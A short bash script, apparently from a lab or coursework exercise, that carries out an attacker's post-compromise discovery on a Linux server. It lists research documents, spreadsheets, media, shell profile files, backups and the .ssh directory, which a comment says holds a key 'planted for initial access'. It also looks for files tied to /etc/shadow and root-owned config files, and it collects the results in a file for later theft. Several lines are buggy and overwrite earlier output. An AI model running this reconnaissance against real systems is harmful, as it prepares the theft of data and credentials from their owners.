#!/bin/bash
#assuming attacker is already aware of the valuable research data hosted on the target server. hence it targets .docx and .xslx files

rm -f fndd.txt

#common file extensions; png, jpg, mp3, txt, pdf, doc, xls
echo -e "----------------------------common file extensions----------------------------\n" > fndd.txt
echo -e "-Extension Type 01: Documents \n" > fndd.txt
find /home/osboxes -name "*.doc" -or -name "*.docx" -or -name "*.pdf" -printf "%a %p \n" >> fndd.txt
echo -e "\n-Extension Type 02: Excel sheets \n" > fndd.txt
find /home/osboxes -name "*.xls" -or -name "*.xlsx" -or -name "*.csv"  -printf "%a %p \n" >> fndd.txt
echo -e "\n-Extension Type 03: Media \n" > fndd.txt
find /home/osboxes -name "*.png" -or -name "*.jpg" -or -name "*.jpeg" -or -name "*.mp3"  -printf "%a %p \n" >> fndd.txt
#ls -la - R $PWD/* grep \.pdf$ | grep \.png$ >> fndd.txt

#$ls -la -R $PWD/* | grep \.pdf$ | grep \.mp3$ 

# #for the following /home/<user>/ dir discovery, it is assumed that the user list has already been previously discovered by the attacker
# echo -e "----------------------------files with 777 permission----------------------------\n" >> fndd.txt
# find /home/osboxes -perm /777 -printf "%a %p \n" >> fndd.txt

#/etc/profile, ~/.bash_profile, ~/.bash_login, ~/.profile. /home/user/.bashrc, /etc/bash.bashrc, /etc/profile.d/.
echo -e "----------------------------files in bash----------------------------\n" >> fndd.txt
find ~/ -name ".bash*" -or -name ".profile*" -printf "%a %p \n" >> fndd.txt

#backup folder 
echo -e "----------------------------backup----------------------------\n" >> fndd.txt
ls -la -R /var/backup >> fndd.txt

#.ssh folder, if there are any other ssh keys than the one planted for initial access
echo -e "-----------------------------.ssh backup key ls----------------------------\n" >> fndd.txt
ls -la -R /home/rsch/.ssh/ >> fndd.txt

#check if /etc/shaodow and /etc/passwd exists
echo -e "----------------------------shadow and config with root permission---------------------------\n" >> fndd.txt
#ls -lad /etc/shadow >> fndd.txt
find /etc/ -group shadow -ls && find /etc/ -user root -name "*.conf" -ls >> fndd.txt


#hidden folders
echo -e "-------------------.ssh backup key ls------------------\n" >> fndd.txt
find . -name ".*" -maxdepth 1 2> /dev/null >> fndd.txt

